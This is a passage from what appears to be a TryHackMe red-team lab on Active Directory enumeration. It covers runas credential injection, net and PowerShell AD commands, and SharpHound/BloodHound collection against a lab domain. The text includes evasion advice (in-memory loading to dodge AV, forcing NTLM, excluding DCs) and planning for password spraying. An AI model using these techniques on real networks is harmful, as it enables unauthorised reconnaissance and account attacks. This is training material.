network authentication but not authenticate against a domain controller. So commands executed locally on the computer will run in the context of your standard Windows account, but any network connections will occur
using the account specified here.
- **/user** -
Here, we provide the details of the domain and the username. It is
always a safe bet to use the Fully Qualified Domain Name (FQDN) instead
of just the NetBIOS name of the domain since this will help with
resolution.
- **cmd.exe** - This is the program we want to execute once the credentials are injected. This can be changed
to anything, but the safest bet is cmd.exe since you can then use that
to launch whatever you want, with the credentials injected.

Once
 you run this command, you will be prompted to supply a password. Note 
that since we added the /netonly parameter, the credentials will not be 
verified directly by a domain controller so that it will accept any 
password. We still need to confirm that the network credentials are 
loaded successfully and correctly.

**Note:** If 
you use your own Windows machine, you should make sure that you run your
 first Command Prompt as Administrator. This will inject an 
Administrator token into CMD. If you run tools that require local 
Administrative privileges from your Runas spawned CMD, the token will 
already be available. This does not give you administrative privileges 
on the network, but will ensure that any local commands you execute, 
will execute with administrative privileges.

# It's Always

**Note:** These
 next steps you only need to perform if you use your own Windows machine
 for the exercise. However, it is good knowledge to learn how to perform
 since it may be helpful on red team exercises.

After
 providing the password, a new command prompt window will open. Now we 
still need to verify that our credentials are working. The most surefire
 way to do this is to list SYSVOL. Any AD account, no matter how low-privileged, can read the contents of the SYSVOL directory.

SYSVOL
 is a folder that exists on all domain controllers. It is a shared 
folder storing the Group Policy Objects (GPOs) and information along 
with any other domain related scripts. It is an essential component for 
Active Directory since it delivers these GPOs to all computers on the 
domain. Domain-joined computers can then read these GPOs and apply the 
applicable ones, making domain-wide configuration changes from a central
 location.

Before we can list SYSVOL, we need to configure our DNS.
 Sometimes you are lucky, and internal DNS will be configured for you 
automatically through DHCP or the VPN connection, but not always (like 
this TryHackMe network). It is good to understand how to do it manually.
 Your safest bet for a DNS server is usually a domain controller. Using 
the IP of the domain controller, we can execute the following commands 
in a PowerShell window:

```powershell
$dnsip = "<DC IP>"
$index = Get-NetAdapter -Name 'Ethernet' | Select-Object -ExpandProperty 'ifIndex'
Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip
```

Of course, 'Ethernet' will be whatever interface is connected to the TryHackMe network. We can verify that DNS is working by running the following:

Command Prompt

```
C:\> nslookup za.tryhackme.com
```

Which should now resolve to the DC
 IP since this is where the FQDN is being hosted. Now that DNS is 
working, we can finally test our credentials. We can use the following 
command to force a network-based listing of the SYSVOL directory:

Command Prompt

```
C:\Tools>dir \\za.tryhackme.com\SYSVOL\
 Volume in drive \\za.tryhackme.com\SYSVOL is Windows
 Volume Serial Number is 1634-22A9

 Directory of \\za.tryhackme.com\SYSVOL

02/24/2022  09:57 PM    <DIR>          .
02/24/2022  09:57 PM    <DIR>          ..
02/24/2022  09:57 PM    <JUNCTION>     za.tryhackme.com [C:\Windows\SYSVOL\domain]
               0 File(s)              0 bytes
               3 Dir(s)  51,835,408,384 bytes free
```

We
 won't go too much in-depth now into the contents of SYSVOL, but note 
that it is also good to enumerate its contents since there may be some 
additional AD credentials lurking there.

# IP vs Hostnames

**Question:** *Is there a difference between `dir \\za.tryhackme.com\SYSVOL` and `dir \\<DC IP>\SYSVOL` and why the big fuss about DNS?*

There
 is quite a difference, and it boils down to the authentication method 
being used. When we provide the hostname, network authentication will 
attempt first to perform Kerberos
 authentication. Since Kerberos authentication uses hostnames embedded 
in the tickets, if we provide the IP instead, we can force the 
authentication type to be NTLM. While on the surface, this does not 
matter to us right now, it is good to understand these slight 
differences since they can allow you to remain more stealthy during a 
Red team assessment. In some instances, organisations will be monitoring
 for OverPass- and Pass-The-Hash Attacks. Forcing NTLM authentication is
 a good trick to have in the book to avoid detection in these cases.

# Using Injected Credentials

Now that we have injected our AD
 credentials into memory, this is where the fun begins. With the 
/netonly option, all network communication will use these injected 
credentials for authentication. This includes all network communications
 of applications executed from that command prompt window.

This is where it becomes potent. Have you ever had a case where an MS SQL
 database used Windows Authentication, and you were not domain-joined? 
Start MS SQL Studio from that command prompt; even though it shows your 
local username, click Log In, and it will use the AD credentials in the 
background to authenticate! We can even use this to [authenticate to web applications that use NTLM Authentication](https://labs.f-secure.com/blog/pth-attacks-against-ntlm-authenticated-web-applications/).

**Enumeration through Microsoft Management Console**

You should have completed the [AD Basics room](https://tryhackme.com/jr/activedirectorybasics) by now, where different AD
 objects were initially introduced. In this task, it will be assumed 
that you understand what these objects are. Connect to THMJMP1 using RDP
 and your provisioned credentials from Task 1 to perform this task.

# Microsoft Management Console

In this task, we will explore our first enumeration method, which is the only method that makes use of a GUI until the very last task. We will be using the Microsoft Management Console (MMC) with the [Remote Server Administration Tools'](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) (RSAT) AD
 Snap-Ins. If you use the provided Windows VM (THMJMP1), it has already 
been installed for you. However, if you are using your own Windows 
machine, you can perform the following steps to install the Snap-Ins:

1. Press **Start**
2. Search **"Apps & Features"** and press enter
3. Click **Manage Optional Features**
4. Click **Add a feature**
5. Search for **"RSAT"**
6. Select "**RSAT: Active Directory Domain Services and Lightweight Directory Tools"** and click **Install**

You
 can start MMC by using the Windows Start button, searching run, and 
typing in MMC. If we just run MMC normally, it would not work as our 
computer is not domain-joined, and our local account cannot be used to 
authenticate to the domain.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/dd93acc5bf807d120eb083d2250e77ef.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/dd93acc5bf807d120eb083d2250e77ef.png)

This
 is where the Runas window from the previous task comes into play. In 
that window, we can start MMC, which will ensure that all MMC network 
connections will use our injected AD credentials.

In MMC, we can now attach the AD RSAT Snap-In:

1. Click **File** -> **Add/Remove Snap-in**
2. Select and **Add** all three Active Directory Snap-ins
3. Click through any errors and warnings
4. Right-click on **Active Directory Domains and Trusts** and select **Change Forest**
5. Enter *za.tryhackme.com* as the **Root domain** and Click **OK**
6. Right-click on **Active Directory Sites and Services** and select **Change Forest**
7. Enter *za.tryhackme.com* as the **Root domain** and Click OK
8. Right-click on **Active Directory Users and Computers** and select **Change Domain**
9. Enter *za.tryhackme.com* as the **Domain** and Click **OK**
10. Right-click on **Active Directory Users and Computers** in the left-hand pane
11. Click on **View** -> **Advanced Features**

If
 everything up to this point worked correctly, your MMC should now be 
pointed to, and authenticated against, the target Domain:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/da8bba5a4df58baf0045d4a71db37e05.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/da8bba5a4df58baf0045d4a71db37e05.png)

We can now start enumerating information about the AD structure here.

# Users and Computers

Let's take a look at the Active Directory structure. For this task, we will focus on AD Users and Computers. Expand that snap-in and expand the za domain to see the initial Organisational Unit (OU) structure:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/a5fc9efbd6a77ee9ea72a25d7ba13240.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/a5fc9efbd6a77ee9ea72a25d7ba13240.png)

Let's
 take a look at the People directory. Here we see that the users are 
divided according to department OUs. Clicking on each of these OUs will 
show the users that belong to that department.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/993c161b6d86d61bf5ecc31a0ce0fa54.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/993c161b6d86d61bf5ecc31a0ce0fa54.png)

Clicking
 on any of these users will allow us to review all of their properties 
and attributes. We can also see what groups they are a member of:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/659127fd61749667192a19e0fb71ad55.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/659127fd61749667192a19e0fb71ad55.png)

We
 can also use MMC to find hosts in the environment. If we click on 
either Servers or Workstations, the list of domain-joined machines will 
be displayed.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/9e353f21616effb4a9cca2f3e86e65ad.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/9e353f21616effb4a9cca2f3e86e65ad.png)

If we had the relevant permissions, we could also use MMC to directly make changes to AD,
 such as changing the user's password or adding an account to a specific
 group. Play around with MMC to better understand the AD domain 
structure. Make use of the search feature to look for objects.

# Benefits

- The GUI provides an excellent method to gain a holistic view of the AD environment.
- Rapid searching of different AD objects can be performed.
- It provides a direct method to view specific updates of AD objects.
- If we have sufficient privileges, we can directly update existing AD objects or add new ones.

# Drawbacks

- The GUI requires RDP access to the machine where it is executed.
- Although searching for an object is fast, gathering AD wide properties or attributes cannot be performed.

**Enumeration through Command Prompt**

# Command Prompt

There are times when you just need to perform a quick and dirty AD
 
lookup, and Command Prompt has your back. Good ol' reliable CMD is handy
 when you perhaps don't have RDP access to a system, defenders are 
monitoring for PowerShell use, and you need to perform your AD 
Enumeration 
through a Remote Access Trojan (RAT). It can even be helpful to embed a 
couple of simple AD enumeration commands in your phishing payload to 
help you gain the vital information that can help you stage the final 
attack.

CMD has a built-in command that we can use to enumerate information about AD, namely `net`. The `net` command is a handy tool to enumerate information about the local system and AD. We will look at a couple of interesting things we can enumerate from this position, but this is not an exhaustive list.

**Note: For this task you will have to use THMJMP1 and won't be able to use your own Windows VM. This will be explained in the drawbacks.**

# Users

We can use the `net` command to list all users in the AD domain by using the `user` sub-option:

Command Prompt

```
C:\>net user /domain
The request will be processed at a domain controller for domain za.tryhackme.com

User accounts for \\THMDC

-------------------------------------------------------------------------------
aaron.conway             aaron.hancock            aaron.harris
aaron.johnson            aaron.lewis              aaron.moore
aaron.patel              aaron.smith              abbie.joyce
abbie.robertson          abbie.taylor             abbie.walker
abdul.akhtar             abdul.bates              abdul.holt
abdul.jones              abdul.wall               abdul.west
abdul.wilson             abigail.cox              abigail.cox1
abigail.smith            abigail.ward             abigail.wheeler
[....]
The command completed successfully.
```

This will return all AD
 users for us and can be helpful in determining the size of the domain 
to stage further attacks. We can also use this sub-option to enumerate 
more detailed information about a single user account:

Command Prompt

```
C:\>net user zoe.marshall /domain
The request will be processed at a domain controller for domain za.tryhackme.com

User name                    zoe.marshall
Full Name                    Zoe Marshall
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/24/2022 10:06:06 PM
Password expires             Never
Password changeable          2/24/2022 10:06:06 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Internet Access
The command completed successfully.
```

**Note:** If the user is only part of a small number of AD
 groups, this command will be able to show us group memberships. 
However, usually, after more than ten group memberships, the command 
will fail to list them all.

# Groups

We can use the `net` command to enumerate the groups of the domain by using the `group` sub-option:

Command Prompt

```
C:\>net group /domain
The request will be processed at a domain controller for domain za.tryhackme.com

Group Accounts for \\THMDC

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
[...]
*Schema Admins
*Server Admins
*Tier 0 Admins
*Tier 1 Admins
*Tier 2 Admins
The command completed successfully.
```

This
 information can help us find specific groups to target for goal 
execution. We could also enumerate more details such as membership to a 
group by specifying the group in the same command:

Command Prompt

```
C:\>net group "Tier 1 Admins" /domain
The request will be processed at a domain controller for domain za.tryhackme.com

Group name     Tier 1 Admins
Comment

Members

-------------------------------------------------------------------------------
t1_arthur.tyler          t1_gary.moss             t1_henry.miller
t1_jill.wallis           t1_joel.stephenson       t1_marian.yates
t1_rosie.bryant
The command completed successfully.
```

# Password Policy

We can use the `net` command to enumerate the password policy of the domain by using the `accounts` sub-option:

Command Prompt

```
C:\>net accounts /domain
The request will be processed at a domain controller for domain za.tryhackme.com

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          Unlimited
Minimum password length:                              0
Length of password history maintained:                None
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        PRIMARY
The command completed successfully.
```

This will provide us with helpful information such as:

- Length of password history kept. Meaning how many unique passwords must the user provide before they can reuse an old password.
- The lockout threshold for incorrect password attempts and for how long the account will be locked.
- The minimum length of the password.
- The maximum age that passwords are allowed to reach indicating if passwords have to be rotated at a regular interval.

This
 information can benefit us if we want to stage additional password 
spraying attacks against the other user accounts that we have now 
enumerated. It can help us better guess what single passwords we should 
use in the attack and how many attacks can we run before we risk locking
 accounts. However, it should be noted that if we perform a blind 
password spraying attack, we may lock out accounts anyway since we did 
not check to determine how many attempts that specific account had left 
before being locked.

You can find the full range of options associated with the net command [here](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems). Play around with these net commands to gather information about specific users and groups.

# Benefits

- No additional or external tooling is required, and these simple commands are often not monitored for by the Blue team.
- We do not need a GUI to do this enumeration.
- VBScript and other macro languages that are often used for phishing payloads
support these commands natively so they can be used to enumerate initial information regarding the AD domain before more specific payloads are crafted.

# Drawbacks

- The `net` commands must be executed from a domain-joined machine. If the machine
is not domain-joined, it will default to the WORKGROUP domain.
- The `net` commands may not show all information. For example, if a user is a
member of more than ten groups, not all of these groups will be shown in the output.

**Enumeration through PowerShell**

# PowerShell

PowerShell
 is the upgrade of Command Prompt. Microsoft first released it in 2006. 
While PowerShell has all the standard functionality Command Prompt 
provides, it also provides access to cmdlets (pronounced command-lets), 
which are .NET classes to perform specific functions. While we can write
 our own cmdlets, like the creators of [PowerView](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView) did, we can already get very far using the built-in ones.

Since
 we installed the AD-RSAT tooling in Task 3, it automatically installed 
the associated cmdlets for us. There are 50+ cmdlets installed. We will 
be looking at some of these, but refer to [this list for the complete list of cmdlets.](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)

Using our SSH terminal, we can upgrade it to a PowerShell terminal using the following command: `powershell`

# Users

We can use the `Get-ADUser` cmdlet to enumerate AD users:

SSH PowerShell

```markup
PS C:\> Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *

AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
[...]
Deleted                              :
Department                           : Consulting
Description                          :
DisplayName                          : Gordon Stevens
DistinguishedName                    : CN=gordon.stevens,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=com
[...]
```

The parameters are used for the following:

- Identity - The account name that we are enumerating
- Properties - Which properties associated with the account will be shown, * will show all properties
- Server - Since we are not domain-joined, we have to use this parameter to point it to our domain controller

For most of these cmdlets, we can also use the `-Filter` parameter that allows more control over enumeration and use the `Format-Table` cmdlet to display the results such as the following neatly:

SSH PowerShell

```markup
PS C:\> Get-ADUser -Filter 'Name -like "*stevens"' -Server za.tryhackme.com | Format-Table Name,SamAccountName -A

Name             SamAccountName
----             --------------
chloe.stevens    chloe.stevens
samantha.stevens samantha.stevens
[...]
janice.stevens   janice.stevens
gordon.stevens   gordon.stevens
```

# Groups

We can use the `Get-ADGroup` cmdlet to enumerate AD groups:

SSH PowerShell

```markup
PS C:\> Get-ADGroup -Identity Administrators -Server za.tryhackme.com

DistinguishedName : CN=Administrators,CN=Builtin,DC=za,DC=tryhackme,DC=com
GroupCategory     : Security
GroupScope        : DomainLocal
Name              : Administrators
ObjectClass       : group
ObjectGUID        : f4d1cbcd-4a6f-4531-8550-0394c3273c4f
SamAccountName    : Administrators
SID               : S-1-5-32-544
```

We can also enumerate group membership using the `Get-ADGroupMember` cmdlet:

SSH PowerShell

```markup
PS C:\> Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com

distinguishedName : CN=Domain Admins,CN=Users,DC=za,DC=tryhackme,DC=com

name              : Domain Admins
objectClass       : group
objectGUID        : 8a6186e5-e20f-4f13-b1b0-067f3326f67c
SamAccountName    : Domain Admins
SID               : S-1-5-21-3330634377-1326264276-632209373-512

[...]

distinguishedName : CN=Administrator,CN=Users,DC=za,DC=tryhackme,DC=com name              : Administrator
objectClass       : user
objectGUID        : b10fe384-bcce-450b-85c8-218e3c79b30fSamAccountName    : Administrator
SID               : S-1-5-21-3330634377-1326264276-632209373-500
```

# AD

A more generic search for any AD objects can be performed using the `Get-ADObject` cmdlet. For example, if we are looking for all AD objects that were changed after a specific date:

SSH PowerShell

```markup
PS C:\> $ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
PS C:\> Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com

Deleted           :
DistinguishedName : DC=za,DC=tryhackme,DC=com
Name              : za
ObjectClass       : domainDNS
ObjectGUID        : 518ee1e7-f427-4e91-a081-bb75e655ce7a

Deleted           :
DistinguishedName : CN=Administrator,CN=Users,DC=za,DC=tryhackme,DC=com
Name              : Administrator
ObjectClass       : user
ObjectGUID        : b10fe384-bcce-450b-85c8-218e3c79b30f
```

If
 we wanted to, for example, perform a password spraying attack without 
locking out accounts, we can use this to enumerate accounts that have a 
badPwdCount that is greater than 0, to avoid these accounts in our 
attack:

SSH PowerShell

```markup
PS C:\> Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
PS C:\>
```

This will only show results if one of the users in the network mistyped their password a couple of times.

# Domains

We can use `Get-ADDomain` to retrieve additional information about the specific domain:

SSH PowerShell

```markup
PS C:\> Get-ADDomain -Server za.tryhackme.com

AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=za,DC=tryhackme,DC=com
DeletedObjectsContainer            : CN=Deleted Objects,DC=za,DC=tryhackme,DC=com
DistinguishedName                  : DC=za,DC=tryhackme,DC=com
DNSRoot                            : za.tryhackme.com
DomainControllersContainer         : OU=Domain Controllers,DC=za,DC=tryhackme,DC=com
[...]
UsersContainer                     : CN=Users,DC=za,DC=tryhackme,DC=com
```

# Altering AD Objects

The great thing about the AD-RSAT
 cmdlets is that some even allow you to create new or alter existing AD 
objects. However, our focus for this network is on enumeration. Creating
 new objects or altering existing ones would be considered AD 
exploitation, which is covered later in the AD module.

However, we will show an example of this by force changing the password of our AD user by using the `Set-ADAccountPassword` cmdlet:

SSH PowerShell

```markup
PS C:\> Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
```

Remember
 to change the identity value and password for the account you were 
provided with for enumeration on the distributor webpage in Task 1.

# Benefits

- The PowerShell cmdlets can enumerate significantly more information than the net commands from Command Prompt.
- We can specify the server and domain to execute these commands using runas from a non-domain-joined machine.
- We can create our own cmdlets to enumerate specific information.
- We can use the ADRSAT cmdlets to directly change AD objects, such as resetting passwords or adding a user to a specific group.

# Drawbacks

- PowerShell is often monitored more by the blue teams than Command Prompt.
- We have to install the AD-RSAT tooling or use other, potentially detectable, scripts for PowerShell enumeration.

**Enumeration through Bloodhound**

Lastly, we will look at performing AD enumeration using [Bloodhound](https://github.com/BloodHoundAD/BloodHound). Bloodhound is the most powerful AD enumeration tool to date, and when it was released in 2016, it changed the AD enumeration landscape forever.

# Bloodhound History

For
 a significant amount of time, red teamers (and, unfortunately, 
attackers) had the upper hand. So much so that Microsoft integrated 
their own version of Bloodhound in its Advanced Threat Protection 
solution. It all came down to the following phrase:

*"Defenders think in lists, Attackers think in graphs." - Unknown*

Bloodhound allowed attackers (and by now defenders too) to visualise the AD
 environment in a graph format with interconnected nodes. Each 
connection is a possible path that could be exploited to reach a goal. 
In contrast, the defenders used lists, like a list of Domain Admins or a
 list of all the hosts in the environment.

This 
graph-based thinking opened up a world to attackers. It allowed for a 
two-stage attack. In the first stage, the attackers would perform 
phishing attacks to get an initial entry to enumerate AD
 information. This initial payload was usually incredibly noisy and 
would be detected and contained by the blue team before the attackers 
could perform any actions apart from exfiltrating the enumerated data. 
However, the attackers could now use this data offline to create an 
attack path in graph format, showing precisely the steps and hops 
required. Using this information during the second phishing campaign, 
the attackers could often reach their goal in minutes once a breach was 
achieved. It is often even faster than it would take the blue team to 
receive their first alert. This is the power of thinking in graphs, 
which is why so many blue teams have also started to use these types of 
tools to understand their security posture better.

# Sharphound

You
 will often hear users refer to Sharphound and Bloodhound 
interchangeably. However, they are not the same. Sharphound is the 
enumeration tool of Bloodhound. It is used to enumerate the AD
 information that can then be visually displayed in Bloodhound. 
Bloodhound is the actual GUI used to display the AD attack graphs. 
Therefore, we first need to learn how to use Sharphound to enumerate AD 
before we can look at the results visually using Bloodhound.

There are three different Sharphound collectors:

- **Sharphound.ps1** - PowerShell script for running Sharphound. However, the latest release of
Sharphound has stopped releasing the Powershell script version. This
version is good to use with RATs since the script can be loaded directly into memory, evading on-disk AV scans.
- **Sharphound.exe** - A Windows executable version for running Sharphound.
- **AzureHound.ps1** - PowerShell script for running Sharphound for Azure (Microsoft Cloud Computing
Services) instances. Bloodhound can ingest data enumerated from Azure to find attack paths related to the configuration of Azure Identity and
Access Management.

**Note: Your Bloodhound and 
Sharphound versions must match for the best results. Usually there are 
updates made to Bloodhound which means old Sharphound results cannot be 
ingested. This network was created using Bloodhound v4.1.0. Please make 
sure to use this version with the Sharphound results.**

When
 using these collector scripts on an assessment, there is a high 
likelihood that these files will be detected as malware and raise an 
alert to the blue team. This is again where our Windows machine that is 
non-domain-joined can assist. We can use the `runas` command to inject the AD
 credentials and point Sharphound to a Domain Controller. Since we 
control this Windows machine, we can either disable the AV or create 
exceptions for specific files or folders, which has already been 
performed for you on the THMJMP1 machine. You can find the Sharphound 
binaries on this host in the `C:\Tools\` directory. We
 will use the SharpHound.exe version for our enumeration, but feel free 
to play around with the other two. We will execute Sharphound as 
follows:

`Sharphound.exe --CollectionMethods <Methods>  --Domain za.tryhackme.com --ExcludeDCs`

Parameters explained:

- CollectionMethods - Determines what kind of data Sharphound would collect. The most
common options are Default or All. Also, since Sharphound caches
information, once the first run has been completed, you can only use the Session collection method to retrieve new user sessions to speed up the process.
- Domain - Here, we specify the domain we want to
enumerate. In some instances, you may want to enumerate a parent or
other domain that has trust with your existing domain. You can tell
Sharphound which domain should be enumerated by altering this parameter.
- ExcludeDCs -This will instruct Sharphound not to touch domain
controllers, which reduces the likelihood that the Sharphound run will
raise an alert.

You can find all the various Sharphound parameters [here](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html). It is good to overview the other parameters since they may be required depending on your red team assessment circumstances.

Using your SSH PowerShell session from the previous task, copy the Sharphound binary to your AD user's Documents directory:

SSH PowerShell

```markup
PS C:\> copy C:\Tools\Sharphound.exe ~\Documents\
PS C:\> cd ~\Documents\
PS C:\Users\gordon.stevens\Documents>
```

We will run Sharphound using the All and Session collection methods:

SSH PowerShell

```markup
PS C:\Users\gordon.stevens\Documents\>SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
2022-03-16T19:11:41.2898508+00:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-03-16T19:11:41.3056683+00:00|INFORMATION|Initializing SharpHound at 7:11 PM on 3/16/2022
2022-03-16T19:11:41.6648113+00:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-03-16T19:11:41.8211318+00:00|INFORMATION|Beginning LDAP search for za.tryhackme.com
[....]
2022-03-16T19:12:31.6981568+00:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2022-03-16T19:12:32.2605943+00:00|INFORMATION|Status: 2163 objects finished (+2163 43.26)/s -- Using 85 MB RAM
2022-03-16T19:12:32.2605943+00:00|INFORMATION|Enumeration finished in 00:00:50.4369344
2022-03-16T19:12:32.5418517+00:00|INFORMATION|SharpHound Enumeration Completed at 7:12 PM on 3/16/2022! Happy Graphing!
```

It
 will take about 1 minute for Sharphound to perform the enumeration. In 
larger organisations, this can take quite a bit longer, even hours to 
execute for the first time. Once completed, you will have a timestamped 
ZIP file in the same folder you executed Sharphound from.

SSH PowerShell

```markup
PS C:\Users\gordon.stevens\Documents> dir

    Directory: C:\Users\gordon.stevens\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/16/2022   7:12 PM         121027 20220316191229_BloodHound.zip
-a----        3/16/2022   5:19 PM         906752 SharpHound.exe
-a----        3/16/2022   7:12 PM         360355 YzE4MDdkYjAtYjc2MC00OTYyLTk1YTEtYjI0NjhiZmRiOWY1.bin
```

We can now use Bloodhound to ingest this ZIP to show us attack paths visually.

# Bloodhound

As mentioned before, Bloodhound is the GUI
 that allows us to import data captured by Sharphound and visualise it 
into attack paths. Bloodhound uses Neo4j as its backend database and 
graphing system. Neo4j is a graph database management system. If you're 
using the AttackBox, you may use the red Bloodhound icon in the Dock to 
launch it. In all other cases, make sure Bloodhound and neo4j are 
installed and configured on your attacking machine. Either way, it is 
good to understand what happens in the background. Before we can start 
Bloodhound, we need to load Neo4j:

Command Prompt

```
thm@thm:~# neo4j console startActive database: graph.db
Directories in use:
  home:         /var/lib/neo4j
  config:       /etc/neo4j
  logs:         /var/log/neo4j
  plugins:      /var/lib/neo4j/plugins
  import:       /var/lib/neo4j/import
  data:         /var/lib/neo4j/data
  certificates: /var/lib/neo4j/certificates
  run:          /var/run/neo4j
Starting Neo4j.
[....]
2022-03-13 19:59:18.014+0000 INFO  Bolt enabled on 127.0.0.1:7687.
```

In another Terminal tab, run `bloodhound --no-sandbox`. This will show you the authentication GUI:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/39f261aecedccbaf118eb2ee69d55129.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/39f261aecedccbaf118eb2ee69d55129.png)

The default credentials for the neo4j database will be `neo4j:neo4j`.
 Use this to authenticate in Bloodhound. To import our results, you will
 need to recover the ZIP file from the Windows host. The simplest way is
 to use SCP command on your AttackBox:

`scp <AD Username>@THMJMP1.za.tryhackme.com:C:/Users/<AD Username>/Documents/<Sharphound ZIP> .`

Once
 you provide your password, this will copy the results to your current 
working directory. Drag and drop the ZIP file onto the Bloodhound GUI to import into Bloodhound. It will show that it is extracting the files and initiating the import.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d7bed860790aaca612cc658d19d782ef.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d7bed860790aaca612cc658d19d782ef.png)

Once all JSON files have been imported, we can start using Bloodhound to enumerate attack paths for this specific domain.

# Attack Paths

There
 are several attack paths that Bloodhound can show. Pressing the three 
stripes next to "Search for a node" will show the options. The very 
first tab shows us the information regarding our current imports.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/5d695d25afebc2b1dfc7cb408704e755.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/5d695d25afebc2b1dfc7cb408704e755.png)

Note
 that if you import a new run of Sharphound, it would cumulatively 
increase these counts. First, we will look at Node Info. Let's search 
for our AD
 account in Bloodhound. You must click on the node to refresh the view. 
Also note you can change the label scheme by pressing LeftCtrl.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/a6e1af6f79653eeedb18ac9c3be7a038.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/a6e1af6f79653eeedb18ac9c3be7a038.png)

We
 can see that there is a significant amount of information returned 
regarding our use. Each of the categories provides the following 
information:

- **Overview** - Provides summaries information such as the number of active sessions the account has and if it can reach high-value targets.
- **Node Properties** - Shows information regarding the AD account, such as the display name and the title.
- **Extra Properties** - Provides more detailed AD information such as the distinguished name and when the account was created.
- **Group Membership** - Shows information regarding the groups that the account is a member of.
- **Local Admin Rights** - Provides information on domain-joined hosts where the account has administrative privileges.
- **Execution Rights** - Provides information on special privileges such as the ability to RDP into a machine.
- **Outbound Control Rights** - Shows information regarding AD objects where this account has permissions to modify their attributes.
- **Inbound Control Rights** - Provides information regarding AD objects that can modify the attributes of this account.

If
 you want more information in each of these categories, you can press 
the number next to the information query. For instance, let's look at 
the group membership associated with our account. By pressing the number
 next to "First Degree Group Membership", we can see that our account is
 a member of two groups.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/5912fb5bc22f7acfa8bc35f86329f0b4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/5912fb5bc22f7acfa8bc35f86329f0b4.png)

Next,
 we will be looking at the Analysis queries. These are queries that the 
creators of Bloodhound have written themselves to enumerate helpful 
information.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/247be9dc8f34b8de181516199b0664dd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/247be9dc8f34b8de181516199b0664dd.png)

Under
 the Domain Information section, we can run the Find all Domain Admins 
query. Note that you can press LeftCtrl to change the label display 
settings.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/9e4a7afd2acd099df71dc70d9eccf705.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/9e4a7afd2acd099df71dc70d9eccf705.png)

The
 icons are called nodes, and the lines are called edges. Let's take a 
